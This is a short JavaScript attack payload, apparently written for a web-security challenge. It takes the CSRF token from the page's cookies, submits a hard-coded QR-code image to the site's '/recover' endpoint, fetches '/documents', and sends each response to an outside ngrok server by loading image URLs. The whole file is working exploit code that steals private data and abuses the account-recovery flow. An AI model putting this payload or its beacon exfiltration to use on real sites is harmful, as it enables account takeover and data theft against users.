function send2server(name, data){
  img = document.createElement("img");
  img.src = "https://e8023e55.ngrok.io/record-data?name="+name+"&data="+btoa(encodeURI(data));
  document.body.appendChild(img);
};


function grab_documents(xxx){
  send2server("status1", ''+xxx.status);
  send2server("response1", xxx.response);
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/documents', true);
  xhr.onload = function() {
    send2server("status", ''+this.status);
    send2server("response", this.response);
  };
  xhr.send();
}

function dataURItoBlob(dataURI) {
    var byteString;
    if (dataURI.split(',')[0].indexOf('base64') >= 0)
        byteString = atob(dataURI.split(',')[1]);
    else
        byteString = unescape(dataURI.split(',')[1]);

    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

    var ia = new Uint8Array(byteString.length);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ia], {type:mimeString});
}
qr = "data:image/png;base64,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";

var fd = new FormData();
fd.append("qrcode", dataURItoBlob(qr), "qr.png");
fd.append("_csrf_token", document.cookie.split("_csrf_token=")[1]);

var xhr = new XMLHttpRequest();
xhr.open('POST', '/recover', true);

xhr.upload.onprogress = function(e) {
  if (e.lengthComputable) {
    var percentComplete = (e.loaded / e.total) * 100;
    console.log(percentComplete + '% uploaded');
  }
};

xhr.onload = function() {
  grab_documents(this);
};

xhr.send(fd);
